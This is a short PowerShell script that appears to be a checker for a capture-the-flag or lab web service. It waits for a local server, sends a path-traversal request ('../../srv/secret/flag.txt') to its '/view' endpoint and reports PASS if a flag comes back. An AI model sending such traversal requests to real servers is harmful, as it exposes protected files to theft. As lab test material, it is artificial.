param($Base="http://127.0.0.1:8080", $Timeout=20)

function Wait-Url($url, $timeout) {
  for ($i=0; $i -lt $timeout; $i++) {
    try { Invoke-WebRequest $url -UseBasicParsing -TimeoutSec 2; return $true } catch { Start-Sleep -Seconds 1 }
  }
  return $false
}

if (-not (Wait-Url -url $Base -timeout $Timeout)) {
  Write-Host "WEB NOT UP" -ForegroundColor Yellow
  exit 2
}

try {
  $r = Invoke-WebRequest "$Base/view?file=../../srv/secret/flag.txt" -UseBasicParsing -TimeoutSec 5
  if ($r.Content -match "FLAG\{[A-Za-z0-9_\-]+\}") { Write-Host "PASS"; exit 0 } else { Write-Host "FAIL"; exit 1 }
} catch {
  Write-Host "FAIL: $_"; exit 1
}
